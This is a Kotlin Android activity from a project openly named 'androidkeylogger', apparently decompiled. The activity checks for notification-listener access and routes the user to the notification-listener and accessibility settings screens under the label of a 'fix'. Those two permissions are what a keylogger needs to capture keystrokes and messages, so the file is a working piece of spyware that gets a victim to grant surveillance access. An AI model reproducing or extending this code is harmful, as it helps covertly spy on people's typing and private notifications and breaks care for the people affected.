package com.azamovhudstc.androidkeylogger.activity

import android.content.Intent
import android.os.Bundle
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.azamovhudstc.androidkeylogger.R
import com.azamovhudstc.androidkeylogger.service.SvcAccFix


class AccessibilityFixActivity : AppCompatActivity() {
    private val REQUEST_CODE_NOTIFICATION_LISTENER = 102
    private  fun openSetting(view: View) {
        try {
            SvcAccFix.j = true
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
            startActivity(Intent("android.settings.ACCESSIBILITY_SETTINGS"))
        } catch (e: Exception) {
            Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
        }
    }

    override fun onBackPressed() {
        finishAffinity()
        super.onBackPressed()
    }

    /* Access modifiers changed, original: protected */
    public override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        if (SvcAccFix.i) {
            SvcAccFix.j = false
            Toast.makeText(this, getString(R.string.type_something), Toast.LENGTH_LONG).show()
            finish()
            return
        }
        setContentView(R.layout.activity_accessibility)
        checkNotificationListenerPermission()
        findViewById<View>(R.id.btn501925).setOnClickListener { view ->
            openSetting(
                view
            )
        }
    }
    private fun checkNotificationListenerPermission() {
        if (!isNotificationListenerEnabled()) {
            requestNotificationListenerPermission()
        } else {
            // The user has granted notification access, you can proceed with your app logic here
            // For example, start your main activity or perform other operations
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val packageName = packageName
        val flat = android.provider.Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun requestNotificationListenerPermission() {
        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
        startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQUEST_CODE_NOTIFICATION_LISTENER) {
            // Handle result of the notification listener settings activity
            if (isNotificationListenerEnabled()) {
                // The user has granted notification access, you can proceed with your app logic here
                // For example, start your main activity or perform other operations
            } else {
                // The user did not grant notification access, handle it accordingly
                // For example, display a message to the user or exit the application gracefully
            }
        }
    }
    /* Access modifiers changed, original: protected */
    public override fun onDestroy() {
        super.onDestroy()
    }

    /* Access modifiers changed, original: protected */
    public override fun onResume() {
        super.onResume()
    }
}